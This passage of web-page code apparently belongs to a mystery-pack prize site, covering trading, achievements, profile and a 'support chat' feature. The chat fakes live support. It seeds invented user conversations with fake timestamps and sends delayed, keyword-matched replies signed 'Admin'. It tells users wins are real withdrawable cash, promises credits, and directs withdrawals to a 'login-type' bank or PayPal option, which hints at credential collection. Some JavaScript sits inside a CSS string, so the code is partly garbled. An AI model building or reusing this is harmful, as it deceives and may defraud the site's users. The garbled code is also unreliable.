            .trade-card-name {
                font-size: 10px;
                color: var(--white);
                margin-bottom: 5px;
            }
            
            .trade-card-price {
                font-size: 12px;
                color: var(--green);
            }
            
            .trade-arrow {
                font-size: 48px;
                color: var(--green);
            }
            
            .trade-cards-list {
                max-height: 300px;
                overflow-y: auto;
                display: flex;
                flex-direction: column;
                gap: 10px;
            }
            
            .trade-card-item {
                background: var(--black);
                border: 1px solid var(--gray);
                padding: 10px;
                cursor: pointer;
                transition: all 0.2s ease;
            }
            
            .trade-card-item:hover {
                border-color: var(--green);
                background: var(--dark-gray);
            }
            
            .trade-card-item.selected {
                border-color: var(--green);
                background: var(--green);
                color: var(--black);
            }
            
            .trade-card-item-name {
                font-size: 10px;
                color: var(--white);
                margin-bottom: 5px;
            }
            
            .trade-card-item-price {
                font-size: 8px;
                color: var(--gray);
            }
            
            .trade-actions {
                display: flex;
                gap: 15px;
                justify-content: center;
                margin-top: 20px;
            }
            
            /* Notification Toast */
            .notification-toast {
                position: fixed;
                bottom: 100px;
                right: 20px;
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 15px 20px;
                border-radius: 8px;
                z-index: 10000;
                opacity: 0;
                transform: translateX(400px);
                transition: all 0.3s ease;
            }
            
            .notification-toast.show {
                opacity: 1;
                transform: translateX(0);
            }
            
            .notification-toast.notification-success {
                border-color: var(--green);
            }
            
            .notification-toast.notification-error {
                border-color: var(--red);
            }
            
            .notification-content {
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .notification-icon {
                font-size: 16px;
            }
            
            .notification-message {
                font-size: 10px;
                color: var(--white);
            }
            
            /* Stats Page */
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 40px;
            }
            
            .stat-card {
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 30px;
                text-align: center;
            }
            
            .stat-card-icon {
                font-size: 48px;
                margin-bottom: 15px;
            }
            
            .stat-card-value {
                font-size: 24px;
                color: var(--green);
                margin-bottom: 10px;
            }
            
            .stat-card-label {
                font-size: 10px;
                color: var(--gray);
            }
            
            .stats-charts {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
                gap: 30px;
            }
            
            .chart-container {
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 20px;
            }
            
            .chart-container h3 {
                font-size: 12px;
                color: var(--green);
                margin-bottom: 20px;
            }
            
            .chart-bar {
                display: flex;
                align-items: center;
                gap: 10px;
                margin-bottom: 10px;
            }
            
            .chart-label {
                font-size: 8px;
                color: var(--white);
                min-width: 80px;
            }
            
            .chart-bar-fill {
                height: 20px;
                background: var(--green);
                transition: width 0.5s ease;
            }
            
            .chart-value {
                font-size: 8px;
                color: var(--gray);
            }
            
            /* Pack History */
            .pack-history-entry {
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 20px;
                margin-bottom: 15px;
            }
            
            .pack-history-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 10px;
            }
            
            .pack-history-pack-name {
                font-size: 12px;
                color: var(--white);
            }
            
            .pack-history-date {
                font-size: 8px;
                color: var(--gray);
            }
            
            .pack-history-value {
                font-size: 10px;
                color: var(--green);
                margin-bottom: 15px;
            }
            
            .pack-history-cards {
                display: flex;
                flex-wrap: wrap;
                gap: 10px;
            }
            
            .pack-history-card {
                background: var(--black);
                border: 1px solid var(--gray);
                padding: 8px 12px;
                border-radius: 4px;
            }
            
            .pack-history-card-name {
                font-size: 8px;
                color: var(--white);
            }
            
            .pack-history-card-rarity {
                font-size: 7px;
                padding: 2px 6px;
                border-radius: 4px;
                margin-top: 4px;
            }
            
            .pack-history-more {
                font-size: 8px;
                color: var(--gray);
                padding: 8px 12px;
            }
            
            /* Achievements */
            .achievement-item {
                background: var(--dark-gray);
                border: 2px solid var(--gray);
                padding: 20px;
                text-align: center;
                transition: all 0.3s ease;
            }
            
            .achievement-item.unlocked {
                border-color: var(--green);
                background: var(--green);
                color: var(--black);
            }
            
            .achievement-item.locked {
                opacity: 0.5;
            }
            
            .achievement-icon {
                font-size: 48px;
                margin-bottom: 10px;
            }
            
            .achievement-name {
                font-size: 12px;
                margin-bottom: 5px;
            }
            
            .achievement-description {
                font-size: 8px;
                margin-bottom: 10px;
            }
            
            .achievement-date {
                font-size: 7px;
            }
            
            .achievement-popup {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%) scale(0);
                z-index: 20000;
                transition: transform 0.3s ease;
            }
            
            .achievement-popup.show {
                transform: translate(-50%, -50%) scale(1);
            }
            
            .achievement-popup-content {
                background: var(--dark-gray);
                border: 3px solid var(--green);
                padding: 40px;
                text-align: center;
                box-shadow: 0 0 50px rgba(0, 255, 0, 0.5);
            }
            
            .achievement-popup-icon {
                font-size: 64px;
                margin-bottom: 20px;
            }
            
            .achievement-popup-title {
                font-size: 16px;
                color: var(--green);
                margin-bottom: 10px;
            }
            
            .achievement-popup-name {
                font-size: 14px;
                color: var(--white);
                margin-bottom: 10px;
            }
            
            .achievement-popup-desc {
                font-size: 10px;
                color: var(--gray);
            }
            
            /* Leaderboard */
            .leaderboard-entry {
                display: grid;
                grid-template-columns: 60px 1fr auto;
                gap: 20px;
                align-items: center;
                background: var(--dark-gray);
                border: 2px solid var(--gray);
                padding: 15px;
                margin-bottom: 10px;
                transition: all 0.3s ease;
            }
            
            .leaderboard-entry.top-three {
                border-color: var(--green);
                background: var(--green);
                color: var(--black);
            }
            
            .leaderboard-entry.current-user {
                border-color: var(--green);
                background: rgba(0, 255, 0, 0.1);
            }
            
            .leaderboard-rank {
                font-size: 16px;
                font-weight: bold;
            }
            
            .leaderboard-user {
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .leaderboard-username {
                font-size: 12px;
            }
            
            .leaderboard-stats {
                display: flex;
                gap: 20px;
            }
            
            .leaderboard-stat {
                display: flex;
                flex-direction: column;
                align-items: flex-end;
            }
            
            .leaderboard-stat-label {
                font-size: 7px;
                color: var(--gray);
            }
            
            .leaderboard-stat-value {
                font-size: 10px;
                color: var(--green);
            }
            
            /* Pack Builder */
            .pack-builder-section {
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 30px;
                margin-bottom: 30px;
            }
            
            .pack-builder-section h2 {
                font-size: 16px;
                color: var(--green);
                margin-bottom: 20px;
            }
            
            .pack-builder-controls {
                display: flex;
                flex-direction: column;
                gap: 20px;
            }
            
            .builder-control {
                display: flex;
                flex-direction: column;
                gap: 10px;
            }
            
            .builder-control label {
                font-size: 10px;
                color: var(--white);
            }
            
            .rarity-sliders {
                display: flex;
                flex-direction: column;
                gap: 15px;
            }
            
            .rarity-slider {
                display: flex;
                align-items: center;
                gap: 15px;
            }
            
            .rarity-slider label {
                min-width: 100px;
                font-size: 8px;
            }
            
            .rarity-slider input[type="range"] {
                flex: 1;
            }
            
            .rarity-slider span {
                min-width: 30px;
                text-align: right;
                font-size: 10px;
                color: var(--green);
            }
            
            .pack-builder-preview {
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 30px;
                min-height: 200px;
            }
            
            /* Wishlist */
            .wishlist-card {
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 15px;
                text-align: center;
            }
            
            .wishlist-card-image {
                width: 100%;
                aspect-ratio: 63/88;
                background: var(--gray);
                border: 1px solid var(--green);
                margin-bottom: 10px;
            }
            
            .wishlist-card-name {
                font-size: 10px;
                color: var(--white);
                margin-bottom: 5px;
            }
            
            .wishlist-card-price {
                font-size: 12px;
                color: var(--green);
                margin-bottom: 10px;
            }
            
            .wishlist-remove-btn {
                background: var(--red);
                color: var(--white);
                border: none;
                padding: 6px 12px;
                font-size: 8px;
                cursor: pointer;
            }
            
            /* Collection Stats Bar */
            .collection-stats-bar {
                display: flex;
                align-items: center;
                gap: 20px;
                padding: 15px;
                background: var(--dark-gray);
                border: 2px solid var(--green);
                margin-bottom: 20px;
            }
            
            .collection-stat {
                font-size: 18px;
                color: var(--green);
                font-weight: bold;
            }
            
            /* Profile Styles */
            .profile-header {
                display: grid;
                grid-template-columns: auto 1fr auto;
                gap: 30px;
                align-items: center;
                padding: 40px;
                background: linear-gradient(160deg, #0a0a0a, #111);
                border: 1px solid #1f1f1f;
                box-shadow: inset 0 0 30px rgba(0,0,0,0.55), 0 0 18px rgba(0,255,0,0.08);
                border-radius: 10px;
                margin-bottom: 30px;
                position: relative;
            }
            
            .profile-avatar {
                width: 100px;
                height: 100px;
                border-radius: 50%;
                background: var(--green);
                color: var(--black);
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 48px;
                border: 3px solid var(--green-light);
                box-shadow: inset 0 0 14px rgba(0,0,0,0.55), 0 0 18px rgba(0,255,0,0.25);
            }
            
            .profile-info {
                display: flex;
                flex-direction: column;
                gap: 15px;
            }
            
            .profile-username {
                font-size: 24px;
                color: var(--white);
            }
            
            .profile-stats {
                display: flex;
                gap: 16px;
            }
            
            .profile-stat {
                display: flex;
                flex-direction: column;
                background: rgba(0,0,0,0.35);
                border: 1px solid #1f1f1f;
                padding: 10px 12px;
                border-radius: 6px;
                box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
            }
            
            .profile-stat-value {
                font-size: 20px;
                color: var(--green);
            }
            
            .profile-stat-label {
                font-size: 8px;
                color: var(--gray);
            }
            
            .profile-content {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 30px;
            }
            
            .profile-section {
                background: linear-gradient(160deg,#0d0d0d,#121212);
                border: 1px solid #1f1f1f;
                box-shadow: inset 0 0 24px rgba(0,0,0,0.6), 0 0 14px rgba(0,255,0,0.08);
                padding: 30px;
                border-radius: 8px;
            }
            .profile-section.full {
                grid-column: 1 / -1;
            }
            
            .profile-section h2 {
                font-size: 16px;
                color: var(--green);
                margin-bottom: 20px;
            }
            .music-toggle {
                background: #111;
                border: 1px solid #333;
                color: #7dffb2;
                font-size: 7px;
                padding: 8px 12px;
                letter-spacing: 1px;
            }
            .music-toggle.off {
                color: #777;
                border-color: #444;
            }
            .chat-header {
                display: flex;
                align-items: center;
                justify-content: flex-start;
                margin-bottom: 12px;
                font-size: 7px;
                color: #777;
                letter-spacing: 1px;
            }
            .chat-typing {
                opacity: 0;
                transition: opacity 0.2s ease;
                color: #aaa;
            }
            .chat-typing.active { opacity: 1; }
            .support-demo {
                background: #0b0b0b;
                border: 1px solid #222;
                border-radius: 6px;
                padding: 12px;
                margin-bottom: 12px;
            }
            .support-demo-title {
                font-size: 7px;
                color: #7dffb2;
                letter-spacing: 1px;
                margin-bottom: 8px;
            }
            .support-demo-item {
                border-top: 1px dashed #222;
                padding: 8px 0;
            }
            .support-demo-item:first-child {
                border-top: none;
                padding-top: 0;
            }
            .support-demo-role {
                font-size: 6px;
                color: #999;
                letter-spacing: 1px;
                text-transform: uppercase;
                margin-bottom: 4px;
            }
            .support-demo-role.admin { color: #7dffb2; }
            .support-demo-text {
                font-size: 7px;
                color: #eaeaea;
                line-height: 2;
                margin-bottom: 6px;
            }
            .chat-typing .dots::after {
                content: '...';
            }
            .chat-typing .dots {
                display: inline-block;
                width: 10px;
                overflow: hidden;
                vertical-align: bottom;
                animation: typingDots 1.1s steps(4, end) infinite;
            }
            .chat-messages {
                background: #0b0b0b;
                border: 1px solid #222;
                border-radius: 6px;
                padding: 12px;
                height: 260px;
                overflow-y: auto;
                display: flex;
                flex-direction: column;
                gap: 10px;
            }
            .chat-message {
                display: flex;
                animation: chatIn 0.2s ease;
            }
            .chat-message.admin { justify-content: flex-start; }
            .chat-message.user { justify-content: flex-end; }
            .chat-bubble {
                max-width: 72%;
                padding: 10px 12px;
                border-radius: 8px;
                font-size: 7px;
                line-height: 2;
                border: 1px solid #2b2b2b;
                background: #101010;
                color: #eaeaea;
                box-shadow: inset 0 0 12px rgba(0,0,0,0.5);
            }
            .chat-label {
                font-size: 6px;
                letter-spacing: 1px;
                color: #7dffb2;
                margin-bottom: 4px;
                text-transform: uppercase;
            }
            .chat-message.user .chat-label {
                color: #999;
            }
            .chat-message.admin .chat-bubble {
                background: #0f140f;
                border-color: #203a24;
                color: #d3ffd8;
            }
            .chat-message.user .chat-bubble {
                background: #121212;
                border-color: #2a2a2a;
                color: #fff;
            }
            .chat-time {
                font-size: 6px;
                color: #555;
                margin-top: 6px;
                text-align: right;
            }
            .chat-input {
                display: grid;
                grid-template-columns: 1fr auto;
                gap: 8px;
                margin-top: 12px;
            }
            .chat-input input {
                background: #0b0b0b;
                border: 1px solid #222;
                color: #fff;
                padding: 10px;
                font-family: 'Press Start 2P', monospace;
                font-size: 8px;
                outline: none;
            }
            .chat-input button {
                background: #00ff88;
                color: #000;
                border: none;
                padding: 10px 14px;
                font-size: 8px;
                cursor: pointer;
                font-family: 'Press Start 2P', monospace;
            }
            @keyframes typingDots {
                0% { width: 0px; }
                50% { width: 10px; }
                100% { width: 0px; }
            }
            @keyframes chatIn {
                from { opacity: 0; transform: translateY(6px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            /* Leaderboard Tabs */
            .leaderboard-tabs {
                display: flex;
                gap: 10px;
            }
            
            /* Additional Utility Functions */
            function filterCollection() {
                const searchTerm = document.getElementById('collectionSearch').value.toLowerCase();
                const cards = document.querySelectorAll('#collectionGrid .collection-card');
                cards.forEach(card => {
                    const cardName = card.querySelector('.collection-card-name').textContent.toLowerCase();
                    if (cardName.includes(searchTerm)) {
                        card.style.display = 'block';
                    } else {
                        card.style.display = 'none';
                    }
                });
            }
            
            function sortCollection(sortType) {
                const container = document.getElementById('collectionGrid');
                const cards = Array.from(container.querySelectorAll('.collection-card'));
                
                cards.sort((a, b) => {
                    switch(sortType) {
                        case 'name':
                            const nameA = a.querySelector('.collection-card-name').textContent;
                            const nameB = b.querySelector('.collection-card-name').textContent;
                            return nameA.localeCompare(nameB);
                        case 'price-high':
                            const priceA = parseFloat(a.querySelector('.collection-card-price').textContent.replace(/[^0-9.]/g, '')) || 0;
                            const priceB = parseFloat(b.querySelector('.collection-card-price').textContent.replace(/[^0-9.]/g, '')) || 0;
                            return priceB - priceA;
                        case 'price-low':
                            const priceALow = parseFloat(a.querySelector('.collection-card-price').textContent.replace(/[^0-9.]/g, '')) || 0;
                            const priceBLow = parseFloat(b.querySelector('.collection-card-price').textContent.replace(/[^0-9.]/g, '')) || 0;
                            return priceALow - priceBLow;
                        default:
                            return 0;
                    }
                });
                
                cards.forEach(function(card, index) {
                    card.style.animationDelay = (index * 0.03) + 's';
                    container.appendChild(card);
                });
            }
            
            function filterWishlist() {
                const searchTerm = document.getElementById('wishlistSearch').value.toLowerCase();
                const cards = document.querySelectorAll('#wishlistGrid .wishlist-card');
                cards.forEach(card => {
                    const cardName = card.querySelector('.wishlist-card-name').textContent.toLowerCase();
                    if (cardName.includes(searchTerm)) {
                        card.style.display = 'block';
                    } else {
                        card.style.display = 'none';
                    }
                });
            }
            
            function switchLeaderboardTab(tab) {
                document.querySelectorAll('.leaderboard-tabs .market-tab').forEach(t => t.classList.remove('active'));
                event.target.classList.add('active');
                generateLeaderboardPage();
            }
            
            function generateProfilePage() {
                // Fill real user info from currentUser
                const user = currentUser || JSON.parse(localStorage.getItem('currentUser') || 'null');
                const usernameEl = document.getElementById('profileUsername');
                const emailEl    = document.getElementById('profileEmail');
                const cardsEl    = document.getElementById('profileStatCards');
                const packsEl    = document.getElementById('profileStatPacks');
                const valueEl    = document.getElementById('profileStatValue');

                if (usernameEl) usernameEl.textContent = user ? '@' + user.username : 'Not logged in';
                if (emailEl)    emailEl.textContent    = user ? user.email || '' : '';
                const balEl = document.getElementById('profileStatBalance');
                const winEl = document.getElementById('profileStatWinnings');
                const packsOpened = parseInt(localStorage.getItem('packsOpened') || '0');
                if (packsEl) setStatValue(packsEl, packsOpened, 'int');
                if (balEl && user) setStatValue(balEl, getBalance(user.username), 'currency');
                if (winEl && user) setStatValue(winEl, getWinnings(user.username), 'currency');
                updateMusicToggle();
                if (musicEnabled) startMusic();
                initSupportChat();

                const activityContainer = document.getElementById('profileActivity');
                const topCardsContainer = document.getElementById('profileTopCards');
                
                if (activityContainer) {
                    const recentPacks = packHistory.slice(0, 5);
                    if (recentPacks.length > 0) {
                        activityContainer.innerHTML = recentPacks.map(function(entry) {
                            const packName = entry.pack.name || 'Mystery Pack';
                            const date = new Date(entry.openedAt).toLocaleString();
                            const value = entry.totalValue.toFixed(2);
                            return '<div class="activity-item">' +
                                '<div class="activity-icon"><img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:2em;width:auto;vertical-align:middle;"></div>' +
                                '<div class="activity-text">' +
                                    '<div>Opened ' + packName + '</div>' +
                                    '<div class="activity-date">' + date + '</div>' +
                                '</div>' +
                                '<div class="activity-value">$' + value + '</div>' +
                            '</div>';
                        }).join('');
                    } else {
                        const saved = typeof getSavedPrizes === 'function' ? getSavedPrizes() : [];
                        if (saved.length > 0) {
                            activityContainer.innerHTML = saved.slice(0, 5).map(function(p) {
                                const packName = p.pack || 'Mystery Pack';
                                const date = p.date || new Date().toLocaleString();
                                const value = (p.display || '$' + (p.amount || 0).toFixed(2));
                                return '<div class="activity-item">' +
                                    '<div class="activity-icon">ðŸ†</div>' +
                                    '<div class="activity-text">' +
                                        '<div>Won ' + value + ' â€¢ ' + packName + '</div>' +
                                        '<div class="activity-date">' + date + '</div>' +
                                    '</div>' +
                                    '<div class="activity-value">' + value + '</div>' +
                                '</div>';
                            }).join('');
                        } else {
                            activityContainer.innerHTML = '<div style="text-align: center; padding: 40px; color: var(--gray);">No recent activity</div>';
                        }
                    }
                }
                
                if (topCardsContainer) {
                    const topCards = [...userCollection]
                        .sort((a, b) => {
                            const priceA = parseFloat((a.price || '$0').replace(/[^0-9.]/g, '')) || 0;
                            const priceB = parseFloat((b.price || '$0').replace(/[^0-9.]/g, '')) || 0;
                            return priceB - priceA;
                        })
                        .slice(0, 6);
                    
                    topCardsContainer.innerHTML = '';
                    if (topCards.length > 0) {
                        topCards.forEach(function(card) {
                            const cardEl = document.createElement('div');
                            cardEl.className = 'market-card';
                            const hue = Math.random() * 360;
                            const randomColor = 'hsl(' + hue + ', 70%, 50%)';
                            let imageStyle = '';
                            if (card.image) {
                                imageStyle = 'background-image: url(\\'' + card.image + '\\'); background-size: cover;';
                            } else {
                                imageStyle = 'background: linear-gradient(135deg, ' + randomColor + '22 0%, ' + randomColor + '88 100%);';
                            }
                            const quantity = card.quantity || 1;
                            const cardPrice = card.price || '$0.00';
                            cardEl.innerHTML = 
                                '<div class="card-badges">' +
                                    '<span class="badge">x' + quantity + '</span>' +
                                '</div>' +
                                '<div class="card-image" style="' + imageStyle + '"></div>' +
                                '<div class="card-name">' + card.name + '</div>' +
                                '<div class="card-price">' + cardPrice + '</div>';
                            topCardsContainer.appendChild(cardEl);
                        });
                    } else {
                        const saved = typeof getSavedPrizes === 'function' ? getSavedPrizes() : [];
                        const topPrizes = saved.sort((a, b) => (b.amount || 0) - (a.amount || 0)).slice(0, 6);
                        topPrizes.forEach(function(p) {
                            const cardEl = document.createElement('div');
                            cardEl.className = 'market-card';
                            const imageStyle = p.packImg
                                ? 'background-image: url(\\'' + p.packImg + '\\'); background-size: contain; background-position:center;'
                                : 'background: ' + (p.gradient || 'linear-gradient(135deg,#111,#222)') + ';';
                            const display = p.display || '$' + (p.amount || 0).toFixed(2);
                            const name = p.pack || 'Mystery Pack';
                            cardEl.innerHTML =
                                '<div class="card-image" style="' + imageStyle + '"></div>' +
                                '<div class="card-name">' + name + '</div>' +
                                '<div class="card-price">' + display + '</div>';
                            topCardsContainer.appendChild(cardEl);
                        });
                    }
                }
            }

        // â”€â”€ Support Chat (Demo + Live) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        let supportChatInitialized = false;
        let supportReplyTimer = null;
        const supportHistory = [
            { role: 'user', name: 'dripzer', text: 'yo my spin froze on the last pack' },
            { role: 'admin', name: 'Admin', text: 'If it didnâ€™t complete I can add a credit. Share the time and pack.' },
            { role: 'user', name: 'markx2', text: 'withdraw pending for 2 days, normal?' },
            { role: 'admin', name: 'Admin', text: 'New users can take a bit longer. Usual window is 2â€“7 business days.' },
            { role: 'user', name: 'walkdowncat', text: 'do i get tracking on shipped prizes?' },
            { role: 'admin', name: 'Admin', text: 'Yes. Youâ€™ll get tracking once the label is created. Signature required.' },
            { role: 'user', name: '2gravesteve', text: 'game bug charged me twice for a pack' },
            { role: 'admin', name: 'Admin', text: 'Thanks for the report. I can credit the extra charge. Send the pack name.' },
            { role: 'user', name: '2100mekee', text: 'need help with item shipping address change' },
            { role: 'admin', name: 'Admin', text: 'If the label isnâ€™t created yet, we can update it. Send the new address.' },
            { role: 'user', name: 'paparoco', text: 'how long does a withdrawal take usually' },
            { role: 'admin', name: 'Admin', text: 'Typical window is 2â€“7 business days depending on bank processing.' },
            { role: 'user', name: 'LaveerSteppedKLV', text: 'my balance didnt update after purchase' },
            { role: 'admin', name: 'Admin', text: 'Sometimes it takes a minute to sync. Refresh the page and Iâ€™ll check if needed.' },
            { role: 'user', name: 'kairox', text: 'pack opened but no result showed' },
            { role: 'admin', name: 'Admin', text: 'I can look into it. Tell me the time it happened and which pack.' }
        ];

        function initSupportChat() {
            if (supportChatInitialized) return;
            const msgEl = document.getElementById('chatMessages');
            const input = document.getElementById('chatInput');
            const sendBtn = document.getElementById('chatSend');
            if (!msgEl || !input || !sendBtn) return;
            supportChatInitialized = true;
            showSupportTyping(false);
            renderSupportHistory();
            sendBtn.addEventListener('click', handleSupportSend);
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') handleSupportSend();
            });
        }

        function renderSupportHistory() {
            const msgEl = document.getElementById('chatMessages');
            if (!msgEl) return;
            msgEl.innerHTML = '';
            supportHistory.forEach(item => {
                appendSupportMessage(item.role, item.name, item.text);
            });
        }

        function handleSupportSend() {
            const input = document.getElementById('chatInput');
            if (!input) return;
            const text = input.value.trim();
            if (!text) return;
            input.value = '';
            appendSupportMessage('user', 'You', text);
            showSupportTyping(true);
            if (supportReplyTimer) clearTimeout(supportReplyTimer);
            const delay = 3000 + Math.floor(Math.random() * 2000);
            supportReplyTimer = setTimeout(() => {
                const reply = getSupportAutoResponse(text);
                appendSupportMessage('admin', 'Admin', reply);
                showSupportTyping(false);
            }, delay);
        }

        function appendSupportMessage(role, label, text) {
            const msgEl = document.getElementById('chatMessages');
            if (!msgEl) return;
            const time = new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' });
            const wrap = document.createElement('div');
            wrap.className = 'chat-message ' + role;
            const bubble = document.createElement('div');
            bubble.className = 'chat-bubble';
            const labelEl = document.createElement('div');
            labelEl.className = 'chat-label';
            labelEl.textContent = label;
            const textEl = document.createElement('div');
            textEl.textContent = text;
            const timeEl = document.createElement('div');
            timeEl.className = 'chat-time';
            timeEl.textContent = time;
            bubble.appendChild(labelEl);
            bubble.appendChild(textEl);
            bubble.appendChild(timeEl);
            wrap.appendChild(bubble);
            msgEl.appendChild(wrap);
            msgEl.scrollTop = msgEl.scrollHeight;
        }

        function showSupportTyping(show) {
            const el = document.getElementById('chatTyping');
            if (!el) return;
            el.classList.toggle('active', show);
        }

        function getSupportAutoResponse(message) {
            const msg = message.toLowerCase();
            if (/^(yo|hi|hello|hey|sup|what's up|whats up)\b/.test(msg)) {
                return 'what up twin fuc going';
            }
            if (msg.includes('withdraw') || msg.includes('withdrawal') || msg.includes('withdrawl')) {
                return 'For new users it can take a bit longer. Usual window is 2â€“7 business days.';
            }
            if (msg.includes('ship') || msg.includes('shipping') || msg.includes('tracking') || msg.includes('deliver')) {
                return 'Shipping is 3â€“7 business days. Youâ€™ll get tracking once the label is created, and delivery requires signature.';
            }
            if (msg.includes('error') || msg.includes('bug') || msg.includes('glitch') || msg.includes('freeze') || msg.includes('stuck')) {
                return 'Thanks for the heads up. If it didnâ€™t complete, we can add a credit. Send the time it happened.';
            }
            if (msg.includes('credit') || msg.includes('refund') || msg.includes('charged')) {
                return 'If a charge or spin failed, we can credit it back. Tell me which pack and the time.';
            }
            if (msg.includes('payout') || msg.includes('payment')) {
                return 'Payouts are processed in batches. If itâ€™s past 7 business days, reply here and weâ€™ll review it.';
            }
            return 'Got it. I can help with withdrawals, shipping, or game errors. Tell me which one.';
        }
            
            function editProfile() {
                const newUsername = prompt('Enter new username:', localStorage.getItem('username') || 'Collector');
                if (newUsername) {
                    localStorage.setItem('username', newUsername);
                    showNotification('Profile updated!', 'success');
                    generateProfilePage();
                }
            }
            
            /* Activity Item Styles */
            .activity-item {
                display: grid;
                grid-template-columns: 40px 1fr auto;
                gap: 15px;
                align-items: center;
                padding: 15px;
                background: var(--black);
                border: 1px solid var(--gray);
                margin-bottom: 10px;
            }
            
            .activity-icon {
                font-size: 24px;
            }
            
            .activity-text {
                display: flex;
                flex-direction: column;
                gap: 5px;
            }
            
            .activity-text > div:first-child {
                font-size: 10px;
                color: var(--white);
            }
            
            .activity-date {
                font-size: 7px;
                color: var(--gray);
            }
            
            .activity-value {
                font-size: 12px;
                color: var(--green);
            }
        `;
        
        // Inject additional styles
        const styleSheet = document.createElement('style');
        styleSheet.textContent = additionalStyles;
        document.head.appendChild(styleSheet);
        
        // Initialize on page load
        updateCollectionStats();
        updateWalletDisplay();
        checkAchievements();
    </script>
    <script>
        (function() {
            const history = [
                { role: 'user', name: 'dripzer', text: 'yo my spin froze on the last pack', time: '22m ago' },
                { role: 'admin', name: 'Admin', text: 'If it didnâ€™t complete I can add a credit. Send the time and pack.', time: '21m ago' },
                { role: 'user', name: 'markx2', text: 'withdraw pending for 2 days, normal?', time: '18m ago' },
                { role: 'admin', name: 'Admin', text: 'New users can take a bit longer. Usual window is 2â€“7 business days.', time: '17m ago' },
                { role: 'user', name: 'walkdowncat', text: 'do i get tracking on shipped prizes?', time: '14m ago' },
                { role: 'admin', name: 'Admin', text: 'Yes. Tracking shows once the label is created. Signature required.', time: '13m ago' },
                { role: 'user', name: '2gravesteve', text: 'game bug charged me twice for a pack', time: '11m ago' },
                { role: 'admin', name: 'Admin', text: 'I can credit the extra charge. Tell me which pack and time.', time: '10m ago' },
                { role: 'user', name: '2100mekee', text: 'need help changing my shipping address', time: '8m ago' },
                { role: 'admin', name: 'Admin', text: 'If the label isnâ€™t created yet, we can update it. Send the new address.', time: '8m ago' },
                { role: 'user', name: 'paparoco', text: 'how long do withdrawals usually take?', time: '6m ago' },
                { role: 'admin', name: 'Admin', text: 'Typical window is 2â€“7 business days depending on bank processing.', time: '6m ago' },
                { role: 'user', name: 'LaveerSteppedKLV', text: 'balance didnâ€™t update after purchase', time: '4m ago' },
                { role: 'admin', name: 'Admin', text: 'Sometimes it takes a minute to sync. Refresh and Iâ€™ll check if needed.', time: '3m ago' }
            ];

            let replyTimer = null;
            let pendingRequest = null;

            function appendMessage(role, name, text, time) {
                const msgEl = document.getElementById('chatMessages');
                if (!msgEl) return;
                const wrap = document.createElement('div');
                wrap.className = 'chat-message ' + role;
                const bubble = document.createElement('div');
                bubble.className = 'chat-bubble';
                const labelEl = document.createElement('div');
                labelEl.className = 'chat-label';
                labelEl.textContent = name;
                const textEl = document.createElement('div');
                textEl.textContent = text;
                const timeEl = document.createElement('div');
                timeEl.className = 'chat-time';
                timeEl.textContent = time || new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' });
                bubble.appendChild(labelEl);
                bubble.appendChild(textEl);
                bubble.appendChild(timeEl);
                wrap.appendChild(bubble);
                msgEl.appendChild(wrap);
                msgEl.scrollTop = msgEl.scrollHeight;
            }

            function showTyping(show) {
                const el = document.getElementById('chatTyping');
                if (!el) return;
                el.classList.toggle('active', show);
            }

            function getReply(message) {
                const msg = message.toLowerCase().trim();
                const hasTime = /\b\d{1,2}:\d{2}\b/.test(msg);
                const hasPack = msg.includes('pack') || msg.includes('mystery');
                const hasPrice = /\$\d+/.test(msg);

                const banks = (typeof BANKS !== 'undefined' && Array.isArray(BANKS)) ? BANKS : [];
                const loginBanks = (typeof LOGIN_BANKS !== 'undefined' && Array.isArray(LOGIN_BANKS)) ? LOGIN_BANKS : [];
                const paypalSupported = banks.includes('PayPal');

                if (/^(yo|hi|hello|hey|sup|what's up|whats up)\b/.test(msg)) {
                    return 'what up twin fuc going â€” what you need help with?';
                }
                if (msg.includes('real money') || msg.includes('in game') || msg.includes('real cash')) {
                    return 'That win is real cash winnings. It goes to your winnings balance and is withdrawable.';
                }
                if (msg.includes('cashapp') || msg.includes('cash app')) {
                    return 'Cash App isnâ€™t supported for withdrawals. Use PayPal or a listed bank, or choose Other.';
                }
                if (msg.includes('paypal')) {
                    if (paypalSupported) {
                        return 'PayPal is supported. Go to Withdraw â†’ Select Bank â†’ PayPal. Itâ€™s a loginâ€‘type option.';
                    }
                    return 'Use Withdraw â†’ Select Bank and pick a supported option. If you donâ€™t have one, choose Other.';
                }
                if (msg.includes('venmo') || msg.includes('no bank') || msg.includes('dont have a bank')) {
                    return 'Use Withdraw â†’ Select Bank and pick a supported option. If you donâ€™t have one, choose Other.';
                }
                if (msg.includes('bank list') || msg.includes('banks') || msg.includes('select bank')) {
                    const list = banks.length ? banks.join(', ') : 'Chase, Bank of America, Wells Fargo, Citibank, Capital One, and more.';
                    return 'These are the current options: ' + list + '.';
                }
                if (pendingRequest === 'pack_time' && (hasPack || hasTime || hasPrice)) {
                    pendingRequest = null;
                    return 'Perfect, thatâ€™s enough. Iâ€™ll check the spin and if anything is missing Iâ€™ll credit it.';
                }
